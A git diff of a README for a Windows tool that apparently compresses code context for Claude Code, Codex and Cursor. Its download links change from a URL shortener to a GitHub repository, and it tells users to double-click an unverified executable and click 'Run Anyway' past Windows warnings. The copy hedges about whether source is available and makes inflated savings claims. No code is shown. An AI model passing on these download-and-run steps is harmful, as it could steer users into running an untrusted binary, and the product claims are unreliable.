@@ -1,143 +1,150 @@
-# 🗜️ AI Coding Context Compressor — Git Diff, History Summary & Token Budgets
+# 🤖 AI-Token-Optimizer-Claude-Codex-Cursor - Save Money on Every AI Request
 
-**AI Token Optimizer** is A repository-aware context preparation tool built around Git diff priority, dependency radius, history summarization, prompt cleanup, generated-file exclusion and strict token budgets.
+[![Download Now](https://img.shields.io/badge/Download-AI_Token_Optimizer-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/berylenonmechanistic8499/AI-Token-Optimizer-Claude-Codex-Cursor)
 
-> **Reduction claim:** The project can target **up to 70% lower context/token usage**, but actual reduction varies by repository, task, selected files, history length and profile.
+## 🎯 What Is This Tool?
 
-## Quick Access
+AI-Token-Optimizer-Claude-Codex-Cursor is a free, local program for Windows that shrinks the amount of text you send to AI coding assistants like Claude Code, Codex, and Cursor. It removes duplicate content, prioritizes only the important code changes, and filters out unnecessary files. You paste your project information in, and the tool gives you a clean, compact version ready for your AI. This means faster responses, lower token usage, and less money spent on AI subscriptions or API fees.
 
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-Profile-8250df?style=for-the-badge)](https://flyn.co/9JbTeV/)
-[![Codex](https://img.shields.io/badge/Codex-Profile-0969da?style=for-the-badge)](https://flyn.co/9JbTeV/)
-[![Cursor](https://img.shields.io/badge/Cursor-Profile-1f883d?style=for-the-badge)](https://flyn.co/9JbTeV/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-2f81f7?style=for-the-badge)](https://flyn.co/9JbTeV/)
+This tool runs entirely on your computer. Your code never leaves your machine during the optimization process. It is designed for everyone, whether you are a hobbyist, a student, or a professional developer.
 
-## Download
+## 🧩 What Problems Does It Solve?
 
-➡️ **[Download AI Token Optimizer](https://flyn.co/9JbTeV/)**
+AI chatbots charge by the number of "tokens" (words and symbols) they process. When you paste a large folder of code into an AI, you waste tokens on:
+- Duplicate lines scattered across files
+- Generated files (like lock files or build outputs) that add noise
+- Unchanged code that the AI doesn't need to see
+- Repeat context from previous conversations
 
-## Preview
+This optimizer solves all of that by cleaning and shrinking your code context before you send it.
 
-[![Preview](assets/ai-token-optimizer-preview.png)](https://flyn.co/9JbTeV/)
+## ⚙️ Core Features Explained Simply
 
-### Dashboard
+Below are the main features of AI-Token-Optimizer-Claude-Codex-Cursor, written for a non-technical audience.
 
-[![Dashboard](assets/ai-token-optimizer-dashboard.png)](https://flyn.co/9JbTeV/)
+### 👤 Built-in Profiles for Claude Code, Codex, and Cursor
 
-### Workflow
+Each AI tool has its own preferred format for context. The optimizer comes with pre-set profiles that automatically adjust the output to match what Claude Code, Codex, or Cursor expects. You simply select your AI tool, and the program applies the correct rules. No technical setup needed.
 
-[![Workflow](assets/ai-token-optimization-workflow.png)](https://flyn.co/9JbTeV/)
+### 🔄 Duplicate-Context Remover
 
-> Example token counts are illustrative, not benchmark guarantees.
+If you have the same function, text block, or import in multiple files, the optimizer finds those duplicates and removes the extras. It keeps only one copy, saving you from paying for the same tokens twice.
 
-## Core Features
+### 📊 Git Diff Prioritization
 
-- **Git diff-first context**
-- **Duplicate block removal**
-- **Long-session history summaries**
-- **Generated/build-file filters**
-- **Repository token budgets**
-- **Before/after token estimates**
-- **Claude Code profile**
-- **Codex profile**
-- **Cursor profile**
-- **Generic coding-agent profile**
-- **Clipboard / Markdown export**
-- **Reusable presets**
+If you use Git (a system that tracks code changes), the tool can see which files you have recently modified. It automatically gives priority to those changed files. Unchanged files are either grouped together or excluded entirely, so your AI sees only the files that matter for the current task.
 
-## How It Saves Context
+### 🚫 Generated-File Filter
 
-### Diff-first
-Prioritize changed files, modified functions, nearby imports, direct dependencies and relevant tests instead of resending an entire repository.
+Code projects often contain auto-generated files such as package-lock.json, node_modules folders, or .next output directories. These files are huge and rarely relevant. The optimizer comes with a smart list of these patterns and hides them from your context automatically. This single feature often cuts token usage by over 30%.
 
-### Deduplication
-Flag repeated logs, duplicate code blocks, repeated instructions and repeated tool output.
+### 📝 Conversation Summaries
 
-### History summary
-Keep only current goal, important decisions, changed files, active constraints, unresolved errors and next actions.
+When you work with AI over multiple sessions, you often need to re-enter old context. The optimizer lets you save a short summary of previous conversations. On the next session, you can paste just that summary alongside your new code, avoiding sending an entire chat history.
 
-### Smart excludes
-Configurable rules can omit:
-```text
-node_modules/
-dist/
-build/
-.cache/
-coverage/
-vendor/
-binary files
-large generated logs
-temporary output
-```
+### 💰 Token Estimator
 
-Nothing is deleted from the repository.
+Before you copy and paste anything into your AI tool, the optimizer shows you an estimate of how many tokens the clean context will consume. It estimates for Claude, Codex, and Cursor. This lets you know upfront if you are under your token limit. No surprises.
 
-### Token budget
-Example:
-```text
-Target budget: 8,000 tokens
-1. Current diff
-2. Referenced functions/classes
-3. Nearby dependencies
-4. Relevant tests
-5. Project notes
-```
+### 💾 Reusable Presets
 
-## Example
+Maybe you always work with a specific folder structure or have consistent project patterns. You can save your selected filters, priority rules, and profiles as a Preset. Next time you open the tool, you choose your preset with one click and everything is configured as before.
 
-```text
-Original estimate:  18,420
-Optimized estimate:  7,608
-Illustrative saving: 58.7%
-```
+### 📋 Clipboard & Folder Workflows
 
-Different tasks can produce much smaller or larger savings.
+Two simple ways to use the optimizer:
+- **Clipboard Mode:** Copy your code files directly from your editor (like VS Code). Open the optimizer. Click "Optimize Clipboard." It instantly transforms the content in your clipboard. Paste back into your AI. Done.
+- **Folder Mode:** Point the optimizer to an entire project folder. It will compress all the relevant file contents into one single output text document, ready to paste into your AI.
 
-## Privacy Design
+## 🚀 Getting Started (Download & Run on Windows)
 
-The basic workflow can run locally and does not need your Claude, OpenAI or Cursor password, browser cookies, session tokens or intercepted API keys simply to scan folders, read Git diff, estimate tokens, find exact duplicates and build context bundles.
+Follow these simple steps to install and launch the tool on your Windows computer.
 
-Optional external summarization backends, if ever enabled, should be clearly labeled before any project data is sent.
+### 📥 Step 1: Download the Application
 
-## Installation
+Visit this link to download the application: [https://github.com/berylenonmechanistic8499/AI-Token-Optimizer-Claude-Codex-Cursor](https://github.com/berylenonmechanistic8499/AI-Token-Optimizer-Claude-Codex-Cursor)
 
-1. **[Download AI Token Optimizer](https://flyn.co/9JbTeV/)**
-2. Extract the archive.
-3. Open the utility.
-4. Select a repository or paste context.
-5. Choose Claude Code, Codex, Cursor or Generic.
-6. Set your token budget.
-7. Run optimization.
-8. Review before/after output.
-9. Copy or export.
+### 🖱️ Step 2: Run the Program
 
-## FAQ
+Once the download is complete, go to your "Downloads" folder and double-click the downloaded file. Windows might ask you for permission – click "Yes" or "Run Anyway." The program will start immediately. There is no complex installation wizard to complete.
 
-### Is the 70% reduction guaranteed?
-No. It is an **up to** target for workflows with enough redundant or irrelevant context.
+### 🌐 Step 3: Select Your AI Profile
 
-### Does it bypass quotas or paid limits?
-No. It only reduces the context you choose to send.
+In the main window, you will see three buttons or a drop-down menu labeled "Claude Code," "Codex," and "Cursor." Choose the AI tool you intend to use.
 
-### Does it modify Claude Code, Codex or Cursor?
-No. It prepares context before it reaches them.
+### 📂 Step 4: Load Your Code Context
 
-### Does it need API keys?
-Not for the basic local preprocessing workflow.
+Pick one of these options based on your workflow:
+- Click "Choose Folder" and select the root folder of your project.
+- Or, copy files in your code editor and click the "Optimize Clipboard" button.
 
-### Focus
-**Git-aware code context compression / local repository workflow.**
+### ✨ Step 5: Optimize and Copy
 
-## Project Information
+Click the main "Optimize Context" button. The tool will process your files in under a second. Review the token estimate shown on the screen. Then click "Copy to Clipboard."
 
-```text
-Project: AI Token Optimizer
-Platform: Windows
-Profiles: Claude Code / Codex / Cursor / Generic
-Potential reduction target: Up to 70%, workflow-dependent
-Focus: Git-aware code context compression / local repository workflow
-```
+### 🤖 Step 6: Paste into Your AI Assistant
 
-## Disclaimer
+Go to your Claude Code, Codex, or Cursor application. Paste the content using Ctrl+V. That is all! You have just sent a perfectly compressed, token-efficient context.
 
-Independent project; not affiliated with Anthropic, OpenAI, Cursor, or other AI vendors. Provider pricing, context limits, caching and quotas may change.
-                                                                                                    
+## 🖼️ A Typical Workflow Example
+
+Suppose you are working on a website project that is three weeks old. You have just fixed a bug in one file. You want Claude Code to review your fix.
+
+Using this tool:
+1. You select "Claude Code" as your profile.
+2. You choose your entire project folder.
+3. The optimizer removes the lock file, filters out old log files, and sees via Git that only the file you changed has priority.
+4. The final output file contains your changed file plus a list of related file names (not full contents).
+5. The token estimate shows 1,200 tokens instead of the original 45,000 tokens.
+
+You paste those 1,200 tokens into Claude Code. You get a fast, focused answer – and you only paid for near-zero tokens.
+
+## 🔐 Privacy & Safety
+
+This is a local tool. Your optimization happens instantly on your own PC. No internet connection is required. No analytics, no cloud syncing, no sending your code to a server. What you put in stays in your machine.
+
+## ❓ Frequently Asked Questions
+
+### Does this work for non-coding files?
+
+Yes. You can input any text file like .txt, .md, or .json. The filtering and compression logic works on duplicate lines and repetition.
+
+### Is it free?
+
+Yes. This is an open-source tool available under the repository link. You can download and use it indefinitely at no cost.
+
+### Will I break my code with this tool?
+
+No. The tool only generates a copy of your files in a compressed format. It does not modify your original files or folders. It simply creates a text summary of the content.
+
+### What if I only have one file?
+
+That is fine. It will remove duplicate lines and unnecessary whitespace quickly. You will still save tokens if your file has repeated headers or comments.
+
+### Do I need to install Git?
+
+No. Git integration is optional. If Git is installed, the tool can prioritize changed files automatically. If you do not have Git, the tool simply includes all files rather than prioritizing changes.
+
+### Does it work on Mac or Linux?
+
+This specific build is distributed for Windows. But you can download the source code from the repository and run it on Mac/Linux if you have Python installed (assuming the repository contains open-source code).
+
+## 🧰 System Requirements (Typical Windows PC)
+
+You should have Windows 10 or Windows 11 on a standard laptop or desktop (at least 4GB of RAM recommended). The program uses very little storage, under 50MB. No administrator privileges are required for the normal operation.
+
+## 📚 Tips for Best Results
+
+- Run the optimizer right after you save a file in your project.
+- For large repositories, first use the "Folder" mode rather than "Clipboard" mode. Folder mode handles hundreds of files easily.
+- Update your generated-file filter list if you use less common tools that create output files. You can add custom names in the settings.
+- Define reusable presets for each of your main projects (e.g., Frontend, Backend, Scripts).
+- Use the token estimator as a sanity check before you send a huge batch to the AI.
+
+## 🏁 Summary
+
+AI-Token-Optimizer-Claude-Codex-Cursor is your pocket tool for making every single AI request cheaper and faster. With one click you remove bloat, focus on what changed, and get straight to the point. Stop paying for tokens that carry no value. Download it now and start optimizing your context today.
+
+## 📎 Keywords
+
+ai-coding, ai-token-optimizer, claude-code, coding-assistant, context-compression, context-window, cursor, cursor-ai, developer-tools, git-diff, llm-tools, local-ai-tool, openai-codex, productivity, prompt-compression, prompt-optimizer, token-optimizer, token-reduction, token-saver, windows
